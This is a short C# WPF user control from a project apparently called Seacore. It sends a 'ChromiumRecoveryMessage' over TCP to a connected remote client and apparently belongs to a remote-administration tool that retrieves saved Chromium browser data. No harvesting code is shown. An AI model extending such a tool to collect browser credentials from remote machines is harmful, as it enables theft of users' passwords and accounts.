using System.Windows.Controls;
using Seacore.Resources.Core;
using SeacoreCommon.Messages;
using System.Net.Sockets;
using System.Windows;

namespace Seacore.Resources.Usercontrols.Clients.Windows.Recovery.UC
{
    public partial class RecoveryDashboardControl : UserControl
    {
        public ClientInfo ClientInfo { get; set; }

        public RecoveryDashboardControl()
        {
            InitializeComponent();
        }

        private void RecoveryBtn_Click(object sender, RoutedEventArgs e)
        {
            if (ClientInfo != null && ClientInfo.TcpClient.Connected)
            {
                NetworkStream stream = ClientInfo.TcpClient.GetStream();
                var message = new ChromiumRecoveryMessage();

                var heartbeatManager = TcpConnectionManager.Instance.HeartbeatManager;

                MessageProcessor.ProcessMessage(message, ClientInfo.TcpClient, stream, heartbeatManager, ClientInfo);
            }
            else
            {
                MessageBox.Show("No Client Selected", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }
    }
}
